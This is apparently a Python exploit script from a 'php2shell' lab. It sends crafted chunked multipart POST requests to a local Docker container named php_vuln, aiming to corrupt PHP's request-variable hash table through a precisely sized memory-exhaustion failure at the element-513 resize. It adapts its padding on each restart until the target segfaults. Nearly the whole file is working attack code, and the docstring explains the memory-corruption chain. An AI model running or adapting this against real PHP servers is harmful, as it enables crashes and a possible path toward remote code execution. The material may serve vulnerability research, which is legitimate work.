#!/usr/bin/env python3
"""php2shell lab, oom24: adaptive walk onto the element-513 resize band.

Drain theorem (oom19-23, both directions measured): value ladders can't
starve the pool (freed param refunds next need; ascent dies clean first).
Only non-refunding drain: arData doubling. Element-513 resize: table
18,432 -> 36,864B, deficit 18,432B. Reachable (513 < 1000 vars), lands
mid-key-run (fill = 466 elements, crossing at ~key #47).
Kill: pool at crossing in [19,034, 19,362): after resize free' fits
param+value (602) but NOT +key (930) -> key zend_string_init dies
POST-COMMIT inside add_to_hash -> malformed bucket -> teardown SIGSEGV.
Feedback per boot: survive -> rem too big (pool > band); param/value death
after resize (alloc 602..) -> rem too small... walk rem adaptively.
"""
import socket
import subprocess
import sys
import time

sys.path.insert(0, "/tmp/phplab")
from oom14 import part, POISON, UNIT, alloc_n  # noqa: E402

NKEYS = 400
V = 64

def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    time.sleep(2.0)

def build(rem: int) -> list:
    ps = []
    for i in range(1, 10):
        ps.append(part(b"n%d" % i, b"A" * UNIT))
    fill = POISON * UNIT
    total = 466 * UNIT + rem - 9 * UNIT
    u = 0
    while total >= UNIT:
        ps.append(part(b"f%d" % u, fill)); total -= UNIT; u += 1
    if total > 0:
        ps.append(part(b"fx", POISON * total))
    for k in range(NKEYS):
        nm = POISON * (280 + (k % 40)) + b"%d" % k
        ps.append(part(nm, POISON * V))
    return ps

def send(port: int, parts: list):
    try:
        s = socket.create_connection(("127.0.0.1", port), timeout=180)
        body = b"".join(parts) + b"--BOUND--\r\n"
        hdr = (b"POST /index.php HTTP/1.1\r\nHost: localhost\r\n"
               b"Transfer-Encoding: chunked\r\nContent-Type: "
               b"multipart/form-data; boundary=BOUND\r\nConnection: close\r\n\r\n")
        s.sendall(hdr)
        for i in range(0, len(body), 4096):
            c = body[i:i+4096]
            s.sendall(b"%x\r\n" % len(c) + c + b"\r\n")
        s.sendall(b"0\r\n\r\n")
        r = b""
        while True:
            d = s.recv(65536)
            if not d:
                break
            r += d
            if len(r) > 200000:
                break
        s.close()
    except (ConnectionResetError, socket.timeout, BrokenPipeError):
        return False, b""
    fatal = b"Fatal error" in r or b"Allowed memory" in r
    return fatal, r

def segcheck():
    r = subprocess.run(["docker", "logs", "php_vuln", "--tail", "150"],
                       capture_output=True, text=True)
    return [l for l in (r.stdout + r.stderr).splitlines()
            if "Segmentation" in l or "SIGSEGV" in l or "exited on signal" in l]

def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081

    def log(*a, **k):
        k.pop("flush", None)
        print(*a, flush=True)

    rem = 24000
    step = 1024
    nf = 0
    for boot in range(48):
        restart()
        fatal, text = send(port, build(rem))
        a = alloc_n(text) if fatal else None
        verdict = "survive"
        moved = None
        if not fatal:
            verdict = "survive"
            moved = -step          # pool above band -> lower rem
            nf += 0
        else:
            nf += 1
            if a is None:
                verdict = "fatal?alloc"
                moved = -step
            elif a <= 600:
                verdict = f"*** KEY DEATH alloc={a} — SEGFAULT CHECK ***"
                moved = 0
            elif a < 18432:
                verdict = f"post-resize small death alloc={a} -> pool just below band"
                moved = +256       # barely missed: pool under band, nudge up
            elif a < 60000:
                verdict = f"resize/param death alloc={a} -> pool well below band"
                moved = +step      # pool under band -> raise rem
            else:
                verdict = f"value death alloc={a}"
                moved = -256
        log(f"boot{boot} rem={rem}: fatal={fatal} alloc={a} {verdict}")
        if moved == 0:
            time.sleep(1.5)
            hits = segcheck()
            for h in hits:
                log("SEGV: " + h)
            if hits:
                log("*** SEGFAULT REPRODUCED — chain complete ***")
                return
            # near-miss: retry same rem a couple boots (jitter may land it)
            continue
        rem = max(8000, rem + moved)
        # adapt step: big moves when far, fine near the band
        if nf and a is not None and 18432 <= a < 60000:
            step = 512
    log(f"== oom24 done: {nf} fatals, final rem={rem} ==")

if __name__ == "__main__":
    main()
